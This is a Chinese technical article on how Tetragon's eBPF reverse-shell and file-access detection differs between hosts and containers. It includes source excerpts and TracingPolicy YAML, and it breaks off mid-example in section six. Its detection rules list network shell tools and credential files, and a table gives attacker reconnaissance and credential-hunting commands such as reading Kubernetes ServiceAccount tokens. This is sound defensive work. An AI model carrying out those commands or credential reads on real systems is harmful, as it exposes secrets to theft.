# Tetragon 主机与容器环境检测差异分析

## 文档定位

本文档系统分析同一检测场景在主机环境与容器环境中的原理差异。核心结论：Tetragon 基于 eBPF 的内核级 Hook 对主机和容器进程的**触发机制完全相同**（同一个 `tcp_connect`、`execve`、`fd_install` 内核函数），真正的差异体现在**命名空间感知、路径解析、策略作用域、元数据富化**四个维度。

> **关联文档**:
> - [Doc 0: 基础架构](tetragon-reverse-shell-detection-foundation.md) — Kprobe 框架、Tail Call 管道
> - [Doc 1: 进程执行检测](tetragon-reverse-shell-process-execution-detection.md) — execve 监控
> - [Doc 2: 网络连接检测](tetragon-reverse-shell-network-connection-detection.md) — tcp_connect
> - [Doc 3: FD 重定向检测](tetragon-reverse-shell-fd-redirection-detection.md) — dup2/dup3
> - [Doc 4: 文件访问检测](tetragon-reverse-shell-file-access-detection.md) — fd_install
> - [Doc 5: 多维关联与综合防御](tetragon-reverse-shell-correlation-and-defense.md)

---

## 目录

- [第一部分：共同基础 — eBPF 内核检测的环境无关性](#第一部分共同基础--ebpf-内核检测的环境无关性)
- [第二部分：环境感知机制 — Tetragon 如何区分主机与容器](#第二部分环境感知机制--tetragon-如何区分主机与容器)
- [第三部分：高危命令检测的环境差异](#第三部分高危命令检测的环境差异)
- [第四部分：反弹 Shell 检测的环境差异](#第四部分反弹-shell-检测的环境差异)
- [第五部分：文件监控的环境差异](#第五部分文件监控的环境差异)
- [第六部分：策略作用域与部署架构差异](#第六部分策略作用域与部署架构差异)
- [第七部分：容器特有威胁与检测](#第七部分容器特有威胁与检测)
- [第八部分：综合对比与最佳实践](#第八部分综合对比与最佳实践)

---

## 第一部分：共同基础 — eBPF 内核检测的环境无关性

### 1.1 核心论点：Hook 在内核层触发，不区分进程来源

Tetragon 的检测能力建立在 eBPF 的 Kprobe/Tracepoint/LSM Hook 之上。这些 Hook 点位于 Linux 内核函数的入口或出口处，对**所有进程**一视同仁——无论进程运行在主机命名空间还是容器命名空间内，只要它触发了相应的内核函数，eBPF 程序就会被执行。

```
┌────────────────────────────────────────────────────────────��─┐
│                     Linux Kernel                             │
│                                                              │
│   ┌──────────────┐   ┌──────────────┐   ┌──────────────┐    │
│   │  tcp_connect  │   │   execve     │   │  fd_install  │    │
│   │  (Kprobe)     │   │ (Tracepoint) │   │  (Kprobe)    │    │
│   └──────┬───────┘   └──────┬───────┘   └──────┬───────┘    │
│          │                  │                   │            │
│          └──────────────────┼───────────────────┘            │
│                             │                                │
│                    ┌────────▼────────┐                       │
│                    │  eBPF Program   │                       │
│                    │  (统一入口)      │                       │
│                    └────────┬────────┘                       │
│                             │                                │
│              ┌──────────────┼──────────────┐                 │
│              │              │              │                 │
│        ┌─────▼─────┐ ┌─────▼─────┐ ┌─────▼─────┐          │
│        │ 主机进程   │ │ 容器进程A  │ │ 容器进程B  │          │
│        │ (host ns)  │ │ (ns-A)    │ │ (ns-B)    │          │
│        └───────────┘ └───────────┘ └───────────┘          │
│                                                              │
│        同一个 eBPF 程序处理所有进程，触发机制完全相同         │
└──────────────��───────────────────────────────────────────────┘
```

### 1.2 Hook 一致性表

下表列出反弹 Shell 检测涉及的主要内核函数，说明它们对主机和容器进程的触发行为完全相同：

| 内核函数 | Hook 类型 | 检测维度 | 主机触发 | 容器触发 | 差异 |
|---------|----------|---------|:-------:|:-------:|------|
| `sched_process_exec` | Tracepoint | 进程执行 | ✅ | ✅ | 无 |
| `sys_execve` / `sys_execveat` | Kprobe | 进程执行 | ✅ | ✅ | 无 |
| `tcp_connect` | Kprobe | 网络外连 | ✅ | ✅ | 无 |
| `tcp_close` | Kprobe | 连接关闭 | ✅ | ✅ | 无 |
| `tcp_sendmsg` | Kprobe | 数据发送 | ✅ | ✅ | 无 |
| `fd_install` | Kprobe | 文件描述符 | ✅ | ✅ | 无 |
| `sys_dup2` / `sys_dup3` | Kprobe | FD 重定向 | ✅ | ✅ | 无 |
| `sys_mknodat` | Kprobe | mkfifo | ✅ | ✅ | 无 |
| `sys_memfd_create` | Kprobe | 无文件执行 | ✅ | ✅ | 无 |
| `security_file_open` | LSM | 文件打开 | ✅ | ✅ | 无 |
| `security_sb_mount` | LSM | 挂载操作 | ✅ | ✅ | 无 |

### 1.3 BPF Tail Call 管道的统一处理

Tetragon 的 Generic Kprobe 框架使用 BPF Tail Call 实现 13 阶段事件处理流水线（详见 [Doc 0: 基础架构](tetragon-reverse-shell-detection-foundation.md)）。这条流水线对所有进程完全相同：

```
generic_kprobe_event()
    │
    ├─ Stage 0: 读取参数 (generic_process_event_0)
    ├─ Stage 1-4: 参数过滤 (filter_arg_1 ~ filter_arg_4)
    ├─ Stage 5: 选择器匹配开始 (selector_0)
    │     ├─ PID 过滤
    │     ├─ Namespace 过滤    ◄── 唯一与环境相关的阶段
    │     ├─ Capabilities 过滤
    │     ├─ Binary 匹配
    │     └─ Action 执行
    ├─ Stage 6-9: 后续选择器 (selector_1 ~ selector_4)
    └─ Stage 10: 事件发送 (process_event)
```

**关键点**：在整条流水线中，只有 Namespace 过滤阶段会区分主机与容器。其余所有阶段（参数读取、参数过滤、Binary 匹配、Action 执行）的行为与进程所处的命名空间无关。

### 1.4 为什么 eBPF 天然环境无关

Linux 容器本质上是命名空间（Namespace）+ 控制组（Cgroup）+ 文件系统隔离（OverlayFS）的组合。容器内的进程与主机上的进程一样，都是普通的 Linux 进程（`task_struct`），共享同一个内核。eBPF 程序运行在内核态，不受命名空间隔离的影响：

- **进程命名空间��PID NS）**：隔离进程 ID 编号，但内核内部始终使用全局 PID
- **网络命名空间（Net NS）**：隔离网络栈，但 `tcp_connect` 等函数在所有网络命名空间的内核栈中都会被调用
- **挂载命名空间（Mnt NS）**：隔离文件系统视图，但内核级文件操作（dentry/inode）是全局的
- **用户命名空间（User NS）**：隔离 UID 映射，但内核内部使用 `kuid_t`/`kgid_t`

---

## 第二部分：环境感知机制 — Tetragon 如何区分主机与容器

虽然 eBPF Hook 触发机制相同，但 Tetragon 具备完整的环境感知能力，能够在事件中标注进程来源并实施差异化策略。这套感知机制分为 BPF 侧和 Go 用户空间侧两部分。

### 2.1 BPF 侧：从 task_struct 读取命名空间

**源码位置**: `bpf/process/bpf_process_event.h:166-254`

Tetragon 的 eBPF 程序通过 `get_namespaces()` 函数从当前进程的 `task_struct→nsproxy` 读取命名空间 inode 编号：

```c
get_namespaces(struct msg_ns *msg, struct task_struct *task)
{
    struct nsproxy *nsproxy;
    struct nsproxy nsp;

    // 1. 从 task_struct 获取 nsproxy 指针
    probe_read(&nsproxy, sizeof(nsproxy), _(&task->nsproxy));
    probe_read(&nsp, sizeof(nsp), _(nsproxy));

    // 2. 读取 UTS 命名空间 inode（兼容 RHEL7）
    if (bpf_core_field_exists(nsproxy->uts_ns->ns)) {
        probe_read(&msg->uts_inum, sizeof(msg->uts_inum),
                   _(&nsp.uts_ns->ns.inum));
    } else {
        // RHEL7 使用 proc_inum 字段
        struct uts_namespace___rhel7 *ns = ...;
        probe_read(&msg->uts_inum, ..., _(&ns->proc_inum));
    }

    // 3. 类似方式读取 IPC、MNT、PID、NET、TIME、CGROUP 共 8 种命名空间
    // ...

    // 4. PID 命名空间需要特殊处理 — 从 thread_pid→numbers[level] 获取
    if (bpf_core_field_exists(task->thread_pid)) {
        struct pid *p = 0;
        probe_read(&p, sizeof(p), _(&task->thread_pid));
        if (p) {
            int level = 0;
            struct upid up;
            probe_read(&level, sizeof(level), _(&p->level));
            probe_read(&up, sizeof(up), _(&p->numbers[level]));
            probe_read(&msg->pid_inum, sizeof(msg->pid_inum),
                       _(&up.ns->ns.inum));
        }
    }
}
```

读取的 8 种命名空间 inode 编号：

| 命名空间 | 字段 | 内核结构 |
|---------|------|---------|
| UTS | `uts_inum` | `nsproxy→uts_ns→ns.inum` |
| IPC | `ipc_inum` | `nsproxy→ipc_ns→ns.inum` |
| MNT | `mnt_inum` | `nsproxy→mnt_ns→ns.inum` |
| PID | `pid_inum` | `thread_pid→numbers[level]→ns.inum` |
| PID_FOR_CHILDREN | `pid_for_children_inum` | `nsproxy→pid_ns_for_children→ns.inum` |
| NET | `net_inum` | `nsproxy→net_ns→ns.inum` |
| TIME | `time_inum` | `nsproxy→time_ns→ns.inum` |
| CGROUP | `cgroup_inum` | `nsproxy→cgroup_ns→ns.inum` |

### 2.2 Go 侧：IsHost 比较逻辑

**源码位置**: `pkg/reader/namespace/namespace_linux.go`

用户空间通过 `InitHostNamespace()` 在启动时缓存 PID 1 的命名空间 inode（PID 1 即 init/systemd，必定运行在主机命名空间）：

```go
func initHostNamespace() (*tetragon.Namespaces, error) {
    knownNamespaces := make(map[string]*tetragon.Namespace)
    for _, n := range listNamespaces {
        // 读取 /proc/1/ns/{nstype} 获取主机命名空间 inode
        ino, err := GetPidNsInode(1, n)
        if err != nil {
            knownNamespaces[n] = &tetragon.Namespace{Inum: 0, IsHost: false}
            continue
        }
        knownNamespaces[n] = &tetragon.Namespace{
            Inum:   ino,
            IsHost: true,
        }
    }
    return &tetragon.Namespaces{
        Uts: knownNamespaces["uts"],
        Ipc: knownNamespaces["ipc"],
        // ... 其他命名空间
    }, nil
}
```

随后，对每个事件中的进程，通过**与 PID 1 的 inode 对比**判断 IsHost：

```go
// GetMsgNamespaces: 将 BPF 消息中的命名空间转换为 Protobuf 格式
func GetMsgNamespaces(ns processapi.MsgNamespaces) (*tetragon.Namespaces, error) {
    hostNs, err := InitHostNamespace()
    retVal := &tetragon.Namespaces{
        Uts: &tetragon.Namespace{
            Inum:   ns.UtsInum,
            IsHost: hostNs.Uts.Inum == ns.UtsInum,  // 与 PID 1 对比
        },
        Mnt: &tetragon.Namespace{
            Inum:   ns.MntInum,
            IsHost: hostNs.Mnt.Inum == ns.MntInum,  // 与 PID 1 对比
        },
        Net: &tetragon.Namespace{
            Inum:   ns.NetInum,
            IsHost: hostNs.Net.Inum == ns.NetInum,  // 与 PID 1 对比
        },
        // ... 其他命名空间类似
    }
    return retVal, nil
}
```

**判断逻辑总结**：

```
进程命名空间 inode == PID 1 命名空间 inode  →  IsHost = true  (主机进程)
进程命名空间 inode != PID 1 命名空间 inode  →  IsHost = false (容器进程)
```

### 2.3 Pod 元数��映射

**源码位置**: `pkg/watcher/pod.go`

在 Kubernetes 环境中，Tetragon 通过 Pod Informer 维护容器 ID 到 Pod 的映射关系：

```go
const containerIDLen = 15  // 容器 ID 截取前 15 个字符

// ContainerIndexFunc: 按容器 ID 索引 Pod
func ContainerIndexFunc(obj any) ([]string, error) {
    switch t := obj.(type) {
    case *corev1.Pod:
        // 遍历 Init/Regular/Ephemeral 三种容器类型
        for _, container := range t.Status.InitContainerStatuses { ... }
        for _, container := range t.Status.ContainerStatuses { ... }
        for _, container := range t.Status.EphemeralContainerStatuses { ... }
    }
}

// FindContainer: 通过容器 ID 查找 Pod 和容器状态
func FindContainer(containerID string, podInformer cache.SharedIndexInformer,
    deletedPodCache *DeletedPodCache) (*corev1.Pod, *corev1.ContainerStatus, bool) {
    // 1. 通过索引快速查找
    objs, _ := podInformer.GetIndexer().ByIndex(ContainerIdx, indexedContainerID)
    // 2. 回退到全量遍历
    if len(objs) != 1 {
        objs = podInformer.GetStore().List()
    }
    // 3. 尝试已删除 Pod 缓存
    return deletedPodCache.FindContainer(indexedContainerID)
}
```

映射结果体现在事件输出中，容器进程的事件会额外包含 Pod 元数据：

```
主机进程事件:                        容器进程事件:
┌─────────────────────┐             ┌─────────────────────────────┐
│ process:            │             │ process:                    │
│   binary: /usr/bin/ │             │   binary: /usr/bin/curl     │
│   pid: 12345        │             │   pid: 67890                │
│   uid: 0            │             │   uid: 0                    │
│   namespaces:       │             │   namespaces:               │
│     pid: {isHost:   │             │     pid: {isHost: false,    │
│       true}         │             │       inum: 4026532456}     │
│                     │             │   pod:                      │
│ (无 Pod 字段)       │             │     namespace: "default"    │
│                     │             │     name: "webapp-abc123"   │
│                     │             │     container:              │
│                     │             │       id: "a1b2c3..."       │
│                     │             │       name: "app"           │
│                     │             │     workload: "webapp"      │
│                     │             │     workload_kind: "Deploy"  │
└─────────────────────┘             └─────────────────────────────┘
```

### 2.4 策略过滤：Cgroup→Namespace BPF Map

**源码位置**: `pkg/policyfilter/namespace.go`

Tetragon 使用 `tg_cgroup_namespace_map` BPF Map 实现基于 Cgroup 的策略过滤：

```go
const CgrpNsMapName = "tg_cgroup_namespace_map"

type NSID struct {
    Namespace string  // K8s Namespace
    Workload  string  // 工作负载名称
    Kind      string  // 工作负载类型（Deployment/DaemonSet 等）
}

type NamespaceMap struct {
    cgroupIdMap *ebpf.Map                  // cgroup ID → StateID (BPF Map)
    nsIdMap     *lru.Cache[StateID, NSID]  // StateID → NSID (用户空间缓存)
    nsNameMap   *lru.Cache[NSID, StateID]  // NSID → StateID (反向缓存)
    id          StateID
}
```

这套机制实现了**策略的 Kubernetes Namespace 级别隔离**：不同 K8s Namespace 中的 Pod 可以应用不同的 TracingPolicy，而主机进程不受 TracingPolicyNamespaced 约束。

### 2.5 Protobuf 定义：Namespace 与 Pod

**源码位置**: `api/v1/tetragon/tetragon.proto:28-103`

```protobuf
message Namespace {
  uint32 inum = 1;    // 命名空间 inode 编号
  bool is_host = 2;   // 是否为主机命名空间
}

message Namespaces {
  Namespace uts = 1;              // 主机名隔离
  Namespace ipc = 2;              // IPC 隔离
  Namespace mnt = 3;              // 挂载点隔离
  Namespace pid = 4;              // 进程 ID 隔离
  Namespace pid_for_children = 5; // 子进程 PID 隔离
  Namespace net = 6;              // 网络隔离
  Namespace time = 7;             // 时钟隔离
  Namespace time_for_children = 8;
  Namespace cgroup = 9;           // Cgroup 隔离
  Namespace user = 10;            // 用户 ID 隔离
}

message Pod {
  string namespace = 1;                    // K8s 命名空间
  string name = 2;                         // Pod 名称
  string uid = 3;                          // Pod UID
  Container container = 4;                 // 容器信息
  map<string, string> pod_labels = 5;      // Pod 标签
  string workload = 6;                     // 工作负载名称
  string workload_kind = 7;               // 工作负载类型
  map<string, string> pod_annotations = 8; // Pod 注解
}

message Container {
  string id = 1;                           // 容器 ID
  string name = 2;                         // 容器名称
  Image image = 3;                         // 容器镜像
  google.protobuf.Timestamp start_time = 4;
  google.protobuf.UInt32Value pid = 5;     // 容器内 PID
  bool maybe_exec_probe = 13;             // 可能来自 K8s exec probe
}
```

---

## 第三部分：高危命令检测的环境差异

### 3.1 二进制路径差异

主机和容器的文件系统内容存在显著差异，直接影响 `matchBinaries` 的策略设计：

| 维度 | 主机环境 | 容器环境 |
|------|---------|---------|
| 基础镜像 | 完整 Linux 发行版 | 最小镜像（Alpine/distroless/scratch） |
| Shell | `/bin/bash`、`/bin/sh`、`/bin/zsh` 通常都在 | Alpine 仅 `/bin/sh`（busybox），distroless 无 Shell |
| 网络工具 | `nc`、`ncat`、`curl`、`wget`、`socat` 通常可用 | 大多数生产镜像不含这些工具 |
| 脚本运行时 | Python、Perl、Ruby、PHP 按需安装 | 仅含应用所需的单一运行时 |
| 包管理器 | `apt`/`yum`/`dnf` 可用 | Alpine 有 `apk`，distroless 无包管理器 |
| 调试工具 | `strace`、`gdb`、`tcpdump` 可安装 | 通常不存在 |

**检测启示**：

- **主机**：攻击者有更多工具可用，需监控更广泛的二进制路径
- **容器**：工具受限，但攻击者可能下载工具（`curl | sh`）或使用容器内已有运行时（如 Python 应用中直接用 Python 反弹 Shell），应重点监控异常进程的出现

### 3.2 进程树差异

主机与容器的进程层级结构显著不同：

```
主机进程树（典型）:                          容器进程树（典型）:
────────────────                            ────────────────
systemd (PID 1)                             entrypoint.sh (PID 1 in container)
  ├── sshd                                    └── python app.py
  │     └── bash (合法用户)                         └── sh        ← 异常！
  │           └── vim                                    └── curl  ← 异常！
  ├── nginx
  │     ├── nginx worker
  │     └── nginx worker                    --- 或 ---
  ├── cron
  │     └── backup.sh                       java -jar app.jar (PID 1 in container)
  └── dockerd                                 └── bash           ← 异常！
        └── containerd                              └── whoami   ← 异常！
```

**关键差异**：

| 特征 | 主机 | 容器 |
|------|------|------|
| 进程树深度 | 较深：`systemd→sshd→bash→cmd` | 较浅：`entrypoint→app→cmd` |
| PID 1 进程 | `systemd` / `init` | 应用进程（`python`、`java`、`nginx`） |
| 合法 Shell 会话 | 常见（SSH 登录） | 罕见（`kubectl exec` 除外） |
| 异常模式 | Web 服务→Shell 是异常 | 任何 Shell 子进程都可能异常 |

### 3.3 命令参数模式差异

攻击者在不同环境中的侦查行为不同：

| 行为 | 主机命令 | 容器命令 |
|------|---------|---------|
| 环境识别 | `uname -a`、`cat /etc/os-release` | `cat /proc/1/cgroup`、`ls /.dockerenv` |
| 网络侦查 | `ifconfig`、`ip addr`、`netstat -tlnp` | `cat /etc/hosts`、`env \| grep KUBE` |
| 凭证搜索 | `cat /etc/shadow`、`find / -name id_rsa` | `cat /var/run/secrets/kubernetes.io/serviceaccount/token` |
| 权限检查 | `id`、`sudo -l` | `cat /proc/1/status \| grep Cap`、`whoami` |
| 逃逸探测 | N/A | `mount`、`fdisk -l`、`ls /dev` |

### 3.4 策略示例对比

**主机优化策略** — 监控完整工具链：

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "host-suspicious-commands"
spec:
  kprobes:
  - call: "sys_execve"
    syscall: true
    args:
    - index: 0
      type: "string"
    selectors:
    - matchBinaries:
      - operator: "In"
        values:
        - "/usr/bin/nc"
        - "/usr/bin/ncat"
        - "/usr/bin/netcat"
        - "/usr/bin/socat"
        - "/usr/bin/curl"
        - "/usr/bin/wget"
        - "/usr/bin/nmap"
      matchNamespaces:
      - namespace: Pid
        operator: In
        values:
        - "host_ns"
      matchActions:
      - action: Post
```

**容器优化策略** — 聚焦容器内异常行为：

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "container-suspicious-commands"
spec:
  kprobes:
  - call: "sys_execve"
    syscall: true
    args:
    - index: 0
      type: "string"
    selectors:
    # 容器内不应该存在的 Shell 和侦查工具
    - matchBinaries:
      - operator: "In"
        values:
        - "/bin/sh"
        - "/bin/bash"
        - "/usr/bin/curl"
        - "/usr/bin/wget"
        - "/usr/bin/apt"
        - "/sbin/apk"
      matchNamespaces:
      - namespace: Pid
        operator: NotIn
        values:
        - "host_ns"
      matchActions:
      - action: Post
```

---

## 第四部分：反弹 Shell 检测的环境差异

### 4.1 网络维度差异

#### 4.1.1 tcp_connect 的 IP 地址处理

`tcp_connect` Kprobe 捕获的 socket 信息来自内核 `sock` 结构，在 NAT 之前读取。

**源码位置**: `bpf/process/types/sock.h:26-67`

```c
FUNC_INLINE void
set_event_from_sock(struct sk_type *event, struct sock *sk)
{
    struct sock_common *common = (struct sock_common *)sk;
    // 读取源地址 — 这是进程 "看到" 的地址
    probe_read(&event->tuple.saddr, IPV4LEN, _(&common->skc_rcv_saddr));
    // 读取目标地址 — 连接的实际目的地
    probe_read(&event->tuple.daddr, IPV4LEN, _(&common->skc_daddr));
    // 端口
    probe_read(&event->tuple.sport, sizeof(event->tuple.sport),
               _(&common->skc_num));
    probe_read(&event->tuple.dport, sizeof(event->tuple.dport),
               _(&common->skc_dport));
    event->tuple.dport = bpf_ntohs(event->tuple.dport);
}
```

**主机与容器的 IP 地址对比**：

| 场景 | 源 IP (`saddr`) | 目标 IP (`daddr`) |
|------|----------------|-------------------|
| 主机进程外连 | 主机物理 IP（如 `192.168.1.100`） | 攻击者真实 IP |
| 容器 bridge 模式外连 | 容器 veth IP（如 `172.17.0.5`） | 攻击者真实 IP |
| 容器 host 网络模式外连 | 主机物理 IP | 攻击者真实 IP |
| Pod 访问 K8s Service | Pod IP（如 `10.244.1.5`） | ClusterIP（如 `10.96.0.1`） |
| Pod 访问另一个 Pod | Pod IP | 目标 Pod IP |

**关键点**：`tcp_connect` 读取的 `daddr` 是 NAT 前的地址。在容器 bridge 模式下，外连流量的目标地址仍然是攻击者的真实 IP，不受 Docker/K8s NAT 影响。但 K8s Service 访问时，`daddr` 是 ClusterIP 而非后端 Pod IP。

#### 4.1.2 CIDR 过滤的环境差异

使用 `matchArgs` 的 CIDR 过滤时，需要考虑 K8s 网络拓扑：

```
主机环境 — 需要排除的 IP 范围:
┌───────────────────────────┐
│ 内部网络: 10.0.0.0/8      │  ← 主要排除内网 IP
│ 管理网络: 172.16.0.0/12   │
│ DNS: 特定 DNS 服务器 IP    │
└───────────────────────────┘

容器/K8s 环境 — 需要额外排除的 IP 范围:
┌───────────────────────────┐
│ Pod CIDR: 10.244.0.0/16   │  ← Pod 间通信
│ Service CIDR: 10.96.0.0/12│  ← ClusterIP 访问
│ Node CIDR: 192.168.0.0/16 │  ← 节点通信
│ CoreDNS: 10.96.0.10       │  ← DNS 查询
└───────────────────────────┘
```

### 4.2 FD 重定向维度：完全无差异

`dup2`/`dup3` 是纯粹的内核系统调用操作，不涉及任何命名空间交互。无论进程在主机还是容器中，FD 重定向的行为和检测方式完全相同：

| 操作 | 主机 | 容器 | 差异 |
|------|------|------|------|
| `dup2(sockfd, 0)` 将 socket 重定向到 stdin | ✅ 可检测 | ✅ 可检测 | **无** |
| `dup2(sockfd, 1)` 将 socket 重定向到 stdout | ✅ 可检测 | ✅ 可检测 | **无** |
| `dup2(sockfd, 2)` 将 socket 重定向到 stderr | ✅ 可检测 | ✅ 可检测 | **无** |
| FollowFD/CopyFD 跟踪 | 完全相同 | 完全相同 | **无** |

### 4.3 文件访问维度：基本无差异

反弹 Shell 中的文件访问操作（`/dev/tcp`、`mkfifo`、`memfd_create`）均为内核级操作：

- **`/dev/tcp`**：Bash 内建的虚拟路径，不涉及实际文件系统
- **`mkfifo`（`sys_mknodat`）**：在当前命名空间的文件系统中创建 FIFO，内核行为一致
- **`memfd_create`**：创建匿名内存文件，完全不涉及文件系统命名空间

### 4.4 多维关联的环境差异

在进行多维关联检测时（参见 [Doc 5: 多维关联](tetragon-reverse-shell-correlation-and-defense.md)），主机与容器的主要差异在于关联的上下文信息：

| 关联维度 | 主机 | 容器 |
|---------|------|------|
| 进程树关联 | 较深的进程树，需追溯到 sshd/systemd | 较浅的进程树，异常更明显 |
| 网络关联 | IP 直接对应物理网络 | 需考虑 Pod CIDR、Service CIDR |
| 身份关联 | 主机用户 UID/GID | K8s ServiceAccount + Pod Labels |
| 时间关联 | 与系统启动时间对比 | 与容器启动时间对比 |

### 4.5 容器感知的反弹 Shell 网络检测策略

以下策略仅监控容器进程的外连行为，并排除 K8s 内部流量：

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "container-reverse-shell-network"
spec:
  kprobes:
  - call: "tcp_connect"
    syscall: false
    args:
    - index: 0
      type: "sock"
    selectors:
    - matchArgs:
      - index: 0
        operator: "DaddrNotIn"
        values:
        - "10.244.0.0/16"    # 排除 Pod CIDR
        - "10.96.0.0/12"     # 排除 Service CIDR
        - "127.0.0.0/8"      # 排除 loopback
      matchNamespaces:
      - namespace: Pid
        operator: NotIn
        values:
        - "host_ns"          # 仅容器进程
      matchActions:
      - action: Post
```

---

## 第五部分：文件监控的环境差异

文件监控是主机与容器差异**最大**的检测维度，主要原因是 Overlay 文件系统对路径解析和文件可见性的影响。

### 5.1 Overlay 文件系统路径解析

**源码位置**: `bpf/lib/bpf_d_path.h:156-352`

Tetragon 通过 dentry walking 解析文件路径。关键函数 `cwd_read()` 从当前 dentry 向上遍历到根 dentry：

```c
FUNC_INLINE long cwd_read(struct cwd_read_data *data)
{
    struct dentry *dentry = data->dentry;
    struct vfsmount *vfsmnt = data->vfsmnt;

    // 检查是否到达根目录
    if (!(dentry != data->root_dentry || vfsmnt != data->root_mnt)) {
        data->resolved = true;  // 解析完成
        return 1;
    }

    // 读取当前 dentry 的名称组件
    struct qstr d_name;
    probe_read(&d_name, sizeof(d_name), _(&dentry->d_name));

    // 向上遍历到父 dentry
    probe_read(&parent, sizeof(parent), _(&dentry->d_parent));
    // ...
}
```

**路径解析的环境差异**：

```
主机进程访问 /etc/shadow:
─────────────────────────
dentry walking 结果: / → etc → shadow
最终路径: /etc/shadow
Tetragon 事件中显示: /etc/shadow

容器进程访问 /etc/shadow:
─────────────────────────
容器的 root dentry 指向 overlay merge 层
dentry walking 结果: (container root) → etc → shadow
最终路径: /etc/shadow  ← 显示为容器内的相对路径！
                       而非宿主机路径如:
                       /var/lib/docker/overlay2/abc.../merged/etc/shadow
```

**关键差异**：BPF 的 dentry walking 从 `task→fs→root` 开始遍历。容器进程的 root dentry 指向 overlay 的 merged 层，因此解析出的路径是**容器内视角的路径**。这对策略编写意味着：

- 监控 `/etc/shadow` 可以同时匹配主机和容器中的该文件
- 路径过滤使用容器内路径即可，无需关心宿主机上的 overlay 路径

### 5.2 Mount 命名空间的影响

Mount 命名空间（Mnt NS）隔离了进程的挂载视图。容器进程看不到主机的完整文件系统，除非通过 Volume 挂载或特权模式。

| 特性 | 主机 | 容器 |
|------|------|------|
| 文件系统根 | 真实根文件系统 | OverlayFS merged 层 |
| `/proc` 视图 | 完整的 `/proc` | 受限的 `/proc`（masked paths） |
| `/sys` 访问 | 完整访问 | 通常只读或受限 |
| 设备文件 | 完整 `/dev` | 受限的设备（除非特权模式） |
| 文件写入 | 直接写入磁盘 | 写入 overlay upperdir（容器层） |

**异常挂载检测**：`security_sb_mount` LSM Hook 可以检测容器内的异常挂载操作，这通常是容器逃逸的前兆：

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "container-mount-detection"
spec:
  kprobes:
  - call: "security_sb_mount"
    syscall: false
    args:
    - index: 0
      type: "string"    # 挂载源
    - index: 1
      type: "path"      # 挂载目标
    - index: 2
      type: "string"    # 文件系统类型
    selectors:
    - matchNamespaces:
      - namespace: Pid
        operator: NotIn
        values:
        - "host_ns"      # 仅容器内
      matchActions:
      - action: Post
```

### 5.3 敏感文件对比表

主机和容器环境中需要监控的敏感文件存在显著差异：

| 类别 | 主机敏感文件 | 容器敏感文件 |
|------|------------|------------|
| 认证凭证 | `/etc/shadow`、`/etc/passwd` | `/var/run/secrets/kubernetes.io/serviceaccount/token` |
| SSH 密钥 | `~/.ssh/id_rsa`、`~/.ssh/authorized_keys` | 通常不存在 |
| 系统配置 | `/etc/sudoers`、`/etc/crontab` | `/etc/resolv.conf`（K8s 注入） |
| 运行时 Socket | `/var/run/docker.sock` | `/var/run/docker.sock`（如果挂载）|
| 容器运行时 | `/var/lib/docker/`、`/var/lib/containerd/` | N/A |
| K8s 配置 | `~/.kube/config`、`/etc/kubernetes/` | `/var/run/secrets/...`、环境变量 |
| 应用密钥 | `/etc/ssl/private/`、应用配置文件 | `/app/.env`、挂载的 Secret Volume |

### 5.4 策略示例对比

**主机文件监控策略**：

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "host-sensitive-file-access"
spec:
  kprobes:
  - call: "security_file_open"
    syscall: false
    args:
    - index: 0
      type: "file"
    selectors:
    - matchArgs:
      - index: 0
        operator: "Prefix"
        values:
        - "/etc/shadow"
        - "/etc/sudoers"
        - "/root/.ssh/"
        - "/etc/kubernetes/"
      matchNamespaces:
      - namespace: Pid
        operator: In
        values:
        - "host_ns"
      matchActions:
      - action: Post
```

**容器文件监控策略**：

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "container-sensitive-file-access"
spec:
  kprobes:
  - call: "security_file_open"
    syscall: false
    args:
    - index: 0
      type: "file"
    selectors:
    - matchArgs:
      - index: 0
        operator: "Prefix"
        values:
        - "/var/run/secrets/kubernetes.io/"  # ServiceAccount token
        - "/run/secrets/"                    # 挂载的 Secret
        - "/var/run/docker.sock"             # Docker socket
        - "/etc/shadow"                      # 仍然重要
      matchNamespaces:
      - namespace: Pid
        operator: NotIn
        values:
        - "host_ns"
      matchActions:
      - action: Post
```

**通用策略（两种环境均适用）**：

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "universal-sensitive-file-access"
spec:
  kprobes:
  - call: "security_file_open"
    syscall: false
    args:
    - index: 0
      type: "file"
    selectors:
    # 无 matchNamespaces — 同时覆盖主机和容器
    - matchArgs:
      - index: 0
        operator: "Prefix"
        values:
        - "/etc/shadow"
        - "/etc/passwd"
      matchActions:
      - action: Post
```

---

## 第六部分：策略作用域与部署架构差异

### 6.1 matchNamespaces 三种模式

**源码位置**: `pkg/selectors/kernel.go:1183-1202`

`matchNamespaces` 支持 `In` 和 `NotIn` 操作符，配合 `host_ns` 关键字实现三种作用域模式：

```go
// 当值为 "host_ns" 时，自动替换为主机命名空间 inode
if v == "host_ns" {
    n, err := namespace.GetHostNsInode(nstype)
    if err != nil {
        return b, 0, fmt.Errorf("matchNamespace reading host '%s' namespace failed: %w", nstype, err)
    }
    val = uint64(n)
}
// 否则直接解析为数字 inode
```

三种模式对比：

| 模式 | 配置 | 适用场景 |
|------|------|---------|
| **仅主机** | `operator: In, values: ["host_ns"]` | 监控主机特有行为（SSH 登录、系统管理） |
| **仅容器** | `operator: NotIn, values: ["host_ns"]` | 监控容器特有威胁（逃逸、K8s 滥用） |
| **指定命名空间** | `operator: In, values: ["4026531836"]` | 精确匹配特定命名空间 inode |

**实际策略示例对比**：

仅主机（来自 `examples/tracingpolicy/fd_install_ns_host.yaml`）：

```yaml
selectors:
- matchNamespaces:
  - namespace: Pid
    operator: In
    values:
    - "host_ns"
```

仅容器 + 强制执行（来自 `examples/tracingpolicy/modules-nohost.yaml`）：

```yaml
selectors:
- matchNamespaces:
  - namespace: Pid
    operator: "NotIn"
    values:
    - "host_ns"
  matchActions:
  - action: Override
    argError: -1
  - action: Sigkill    # 容器中加载内核模块 → 直接终止
```

CVE + 命名空间过滤（来自 `examples/tracingpolicy/cves/cve-2023-2640-overlayfs-ubuntu.yaml`）：

```yaml
selectors:
- matchNamespaces:
  - namespace: User
